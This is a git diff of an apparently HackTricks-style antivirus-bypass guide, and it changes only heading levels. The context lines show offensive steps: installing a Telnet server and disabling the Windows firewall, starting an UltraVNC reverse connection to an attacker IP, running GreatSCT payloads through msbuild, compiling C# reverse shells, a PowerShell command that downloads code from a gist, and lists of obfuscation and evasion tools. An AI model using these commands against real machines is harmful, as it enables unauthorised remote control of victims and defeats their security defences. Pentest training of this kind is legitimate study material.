@@ -17,9 +17,7 @@ Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 </details>
 
 
-# AV Bypass
-
-## **Telnet Server**
+# **Telnet Server**
 
 Until Windows10, all Windows came with a **Telnet server** that you could install (as administrator) doing:
 
@@ -40,7 +38,7 @@ tlntadmn config port=80
 netsh advfirewall set allprofiles state off
 ```
 
-## UltraVNC
+# UltraVNC
 
 Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (you want the bin downloads, not the setup)
 
@@ -52,7 +50,7 @@ Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.
 
 Then, move the binary _**winvnc.exe**_ and **newly** created file _**UltraVNC.ini**_ inside the **victim**
 
-### **Reverse connection**
+## **Reverse connection**
 
 The **attacker** should **execute inside** his **host** the binary `vncviewer.exe -listen 5900` so it will be **prepared** to catch a reverse **VNC connection**.
 Then, inside the **victim**: Start the winvnc daemon `winvnc.exe -run` and run `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`
@@ -62,7 +60,7 @@ Then, inside the **victim**: Start the winvnc daemon `winvnc.exe -run` and run `
 - Don't start `winvnc` without `UltraVNC.ini` in the same directory or it will cause [the config window](https://i.imgur.com/rfMQWcf.png) to open
 - Don't run `winvnc -h` for help or you'll trigger a [popup](https://i.imgur.com/oc18wcu.png)
 
-## GreatSCT
+# GreatSCT
 
 Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
 
@@ -94,11 +92,11 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
 
 **Current defender will terminate the process very fast.**
 
-## Compiling our own reverse shell
+# Compiling our own reverse shell
 
 https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15
 
-#### First C# Revershell
+### First C# Revershell
 
 Compile it with:
 
@@ -186,7 +184,7 @@ namespace ConnectBack
 
 [https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple\_Rev\_Shell.cs](https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple\_Rev\_Shell.cs)
 
-## C# using compiler
+# C# using compiler
 
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
@@ -210,7 +208,7 @@ powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.g
 
 C# obfuscators list: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)
 
-## C++
+# C++
 
 ```
 sudo apt-get install mingw-w64
@@ -230,7 +228,7 @@ https://github.com/l0ss/Grouper2
 
 {% embed url="http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/" %}
 
-## Other tools
+# Other tools
 
 ```bash
 # Veil Framework:
@@ -257,7 +255,7 @@ https://github.com/TheWover/donut
 https://github.com/praetorian-code/vulcan
 ```
 
-## More
+# More
 
 {% embed url="https://github.com/EgeBalci/sgn" %}
 
